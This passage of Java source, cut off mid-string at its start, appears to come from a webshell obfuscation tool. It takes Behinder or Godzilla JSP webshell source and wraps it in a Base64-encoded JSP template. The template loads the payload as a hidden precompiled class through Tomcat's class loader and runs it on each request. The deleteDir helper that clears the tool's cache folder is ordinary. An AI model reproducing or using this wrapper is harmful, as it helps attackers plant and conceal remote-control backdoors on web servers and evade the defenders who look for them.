sKICAgIEpzcENsYXNzTG9hZGVyIGpzcENsYXNzTG9hZGVyID0gbmV3IEpzcENsYXNzTG9hZGVyKGpzcFNlcnZsZXQuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKTsKICAgIEh0dHBKc3BCYXNlIGh0dHBKc3BCYXNlID0gKEh0dHBKc3BCYXNlKSBqc3BDbGFzc0xvYWRlci5maW5kQ2xhc3MoIm9yZy5hcGFjaGUuanNwLiRrZXkkX2pzcCIpLi8qYSovCiAgICAgICAgICAgIG5ld0luc3RhbmNlKCk7CiAgICBTdGFuZGFyZFdyYXBwZXJGYWNhZGUgc3RhbmRhcmRXcmFwcGVyRmFjYWRlID0gbmV3IFN0YW5kYXJkV3JhcHBlckZhY2FkZShuZXcgU3RhbmRhcmRXcmFwcGVyKCkpOwogICAgRmllbGQgY29uZmlnMSA9IHN0YW5kYXJkV3JhcHBlckZhY2FkZS5nZXRDbGFzcygpLmdldERlY2xhcmVkRmllbGQoImNvbmZpZyIpOwogICAgY29uZmlnMS5zZXRBY2Nlc3NpYmxlKHRydWUpOwogICAgY29uZmlnMS5zZXQoc3RhbmRhcmRXcmFwcGVyRmFjYWRlLCBwYWdlQ29udGV4dC5nZXRTZXJ2bGV0Q29uZmlnKCkpOwogICAgRmllbGQgY29udGV4dCA9IHN0YW5kYXJkV3JhcHBlckZhY2FkZS5nZXRDbGFzcygpLmdldERlY2xhcmVkRmllbGQoImNvbnRleHQiKTsKICAgIGNvbnRleHQuc2V0QWNjZXNzaWJsZSh0cnVlKTsKICAgIGNvbnRleHQuc2V0KHN0YW5kYXJkV3JhcHBlckZhY2FkZSwgcGFnZUNvbnRleHQuZ2V0U2VydmxldENvbnRleHQoKSk7CiAgICBodHRwSnNwQmFzZS5pbml0KHN0YW5kYXJkV3JhcHBlckZhY2FkZSk7CiAgICBodHRwSnNwQmFzZS5zZXJ2aWNlKHJlcXVlc3QsIHJlc3BvbnNlKTsKJT4=";
                encode = new String(Base64.getDecoder().decode(demo));

                encode = encode.replace("$key$",this.key);
                encode = encode.replace("$base64code$",jspsource);

                deleteDir("./cache/");

                return new String[]{this.encode,""};
            }catch (Exception e){
                return new String[]{"加密失败",""};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉JSP源码",""};
        }
    }

    public static void deleteDir(String path) {
        File file = new File(path);
        File[] list = file.listFiles();
        for (File f : list) {
            if (f.isDirectory()) {
                deleteDir(f.getPath());
            } else {
                f.delete();
            }
        }
        file.delete();
    }
}
